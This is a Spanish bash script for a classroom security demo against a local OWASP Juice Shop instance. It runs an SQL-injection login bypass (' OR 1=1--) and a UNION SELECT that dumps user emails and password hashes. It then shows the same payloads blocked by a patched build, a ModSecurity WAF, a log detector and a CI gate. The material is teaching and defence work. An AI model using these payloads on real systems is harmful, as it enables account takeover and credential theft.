#!/usr/bin/env bash
# =====================================================================================
# SI3006 — Guion ejecutable de la demo en vivo (≈ 6 minutos)
#
#   ./DEMO.sh            → ejecuta la demo completa paso a paso
#   ./DEMO.sh --setup    → solo levanta el entorno (contenedores y app parcheada)
#   ./DEMO.sh --down     → apaga todo
#
# Requisitos: docker, node (>= 22), curl, python3
# =====================================================================================
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SRC="$ROOT/juice-shop"               # árbol con el parche aplicado
VULN_URL="http://localhost:3000"     # imagen oficial v20.3.0 (sin parchear)
FIX_URL="http://localhost:3001"      # código fuente con el parche
WAF_URL="http://localhost:8090"      # WAF (OWASP CRS) delante de la copia vulnerable

c(){ printf '\n\033[1;36m%s\033[0m\n' "━━━ $* ━━━"; }
k(){ printf '\033[1;33m%s\033[0m\n' "→ $*"; }
hr(){ printf '\033[2m%s\033[0m\n' "──────────────────────────────────────────────────────────────────────────"; }

setup(){
  c "SETUP"
  k "1/4 · Juice Shop vulnerable (imagen oficial v20.3.0) en :3000"
  docker rm -f js-attack >/dev/null 2>&1
  docker run -d --name js-attack -p 3000:3000 bkimminich/juice-shop:v20.3.0 >/dev/null

  k "2/4 · Compilando el código fuente parcheado (tsc) y arrancando en :3001"
  ( cd "$SRC" && npx tsc )
  pkill -f "node build/app" 2>/dev/null
  ( cd "$SRC" && PORT=3001 NODE_ENV=production nohup node build/app >/tmp/js3001.log 2>&1 & )

  k "3/4 · WAF de demostración (ModSecurity + OWASP CRS) en :8090 → :3000"
  docker rm -f waf >/dev/null 2>&1
  docker run -d --name waf --add-host=host.docker.internal:host-gateway \
    -e BACKEND=http://host.docker.internal:3000 -e PORT=8080 -e SERVER_NAME=localhost \
    -p 8090:8080 owasp/modsecurity-crs:nginx >/dev/null

  k "4/4 · Esperando disponibilidad"
  for u in "$VULN_URL" "$FIX_URL" "$WAF_URL"; do
    for _ in $(seq 1 40); do
      if curl -fsS -o /dev/null "$u/rest/admin/application-version"; then break; fi
      sleep 2
    done
    printf '   %-26s %s\n' "$u" "$(curl -s -o /dev/null -w '%{http_code}' "$u/")"
  done
  echo; echo "Listo. Ahora: ./DEMO.sh"
}

down(){
  c "TEARDOWN"
  docker rm -f js-attack waf >/dev/null 2>&1; pkill -f "node build/app" 2>/dev/null; echo "ok"
}

demo(){
  hr; c "PASO 1 — El servicio está en pie y expuesto"
  k "Versión que reporta el servicio (sin autenticación):"
  curl -s "$VULN_URL/rest/admin/application-version"; echo

  hr; c "PASO 2 — ATAQUE: bypass de autenticación (SQLi)"
  k "Payload: ' OR 1=1--   →  ¿nos da un JWT sin saber la contraseña?"
  RESP=$(curl -s -X POST "$VULN_URL/rest/user/login" -H 'Content-Type: application/json' \
         -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")
  echo "$RESP" | head -c 260; echo " …"
  TOK=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
  k "El payload del JWT dice:"
  echo "$TOK" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1)[:420])"

  hr; c "PASO 3 — IMPACTO: recurso solo para administradores"
  printf '   GET /api/Users sin token       -> HTTP %s\n' "$(curl -s -o /dev/null -w '%{http_code}' "$VULN_URL/api/Users")"
  printf '   GET /api/Users con el token    -> HTTP %s   ← somos admin\n' \
         "$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$VULN_URL/api/Users")"

  hr; c "PASO 4 — IMPACTO: volcado de la tabla Users (UNION SELECT)"
  curl -s -G --data-urlencode "q=qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--" \
       "$VULN_URL/rest/products/search" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)['data']
print(f'   {len(d)} cuentas exfiltradas en UNA petición HTTP 200:')
for r in d[:3]: print('     ',r['name'],'->',r['description'])
print('      …')
"
  k "Y como el hash es MD5 sin sal, se rompe al instante:"
  python3 -c "import hashlib;print('        md5(\"admin123\") =',hashlib.md5(b'admin123').hexdigest())"

  hr; c "PASO 5 — REMEDIACIÓN: el mismo ataque contra el código parcheado"
  printf '   login   '"'"' OR 1=1--            -> HTTP %s\n' \
    "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$FIX_URL/rest/user/login" -H 'Content-Type: application/json' -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")"
  printf '   search  UNION SELECT … Users   -> %s\n' \
    "$(curl -s -G --data-urlencode "q=qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--" "$FIX_URL/rest/products/search" | head -c 90)"
  k "Y el login legítimo sigue funcionando (sin regresión):"
  printf '   admin/admin123                 -> HTTP %s\n' \
    "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$FIX_URL/rest/user/login" -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}')"

  hr; c "PASO 6 — CONTROL COMPENSATORIO: WAF delante del código SIN parchear"
  k "Mismos payloads, mismo código vulnerable, pero con OWASP CRS delante:"
  printf '   login   '"'"' OR 1=1--            -> HTTP %s\n' \
    "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$WAF_URL/rest/user/login" -H 'Content-Type: application/json' -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")"
  printf '   search  UNION SELECT … Users   -> HTTP %s\n' \
    "$(curl -s -o /dev/null -w '%{http_code}' -G --data-urlencode "q=qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--" "$WAF_URL/rest/products/search")"
  printf '   búsqueda legítima q=apple      -> HTTP %s  ← tráfico bueno intacto\n' \
    "$(curl -s -o /dev/null -w '%{http_code}' "$WAF_URL/rest/products/search?q=apple")"

  hr; c "PASO 7 — DETECCIÓN: ¿quedó rastro?"
  LOG=$(ls -t "$SRC"/logs/access.log* 2>/dev/null | head -1)
  k "Detector sobre el access log del servicio ($(basename "${LOG:-sin-log}")):"
  python3 "$ROOT/deliverables/blue-team/detector_ids.py" "${LOG:-/dev/null}" 2>&1 | tail -4
  echo "   (los AUTH-001 del login legítimo son el coste de correlacionar solo por IP;"
  echo "    se afinan con una lista blanca de User-Agent autorizado)"
  k "Salida JSON de una alerta (lista para Wazuh/ELK):"
  python3 "$ROOT/deliverables/blue-team/detector_ids.py" "${LOG:-/dev/null}" 2>/dev/null | head -1

  hr; c "PASO 8 — DEVSECOPS: el gate"
  echo "   (se lanza aparte para ver el color del resultado)"
  echo "   ./deliverables/devsecops/gate_devsecops.sh /tmp/gate-vuln     → ROJO"
  echo "   ./deliverables/devsecops/gate_devsecops.sh $SRC               → VERDE"
  echo
  printf '\033[1;32m%s\033[0m\n' "DEMO COMPLETA ✔"
}

case "${1:-run}" in
  --setup) setup ;;
  --down)  down ;;
  run)     demo ;;
  *)       echo "uso: $0 [--setup|--down]"; exit 1 ;;
esac
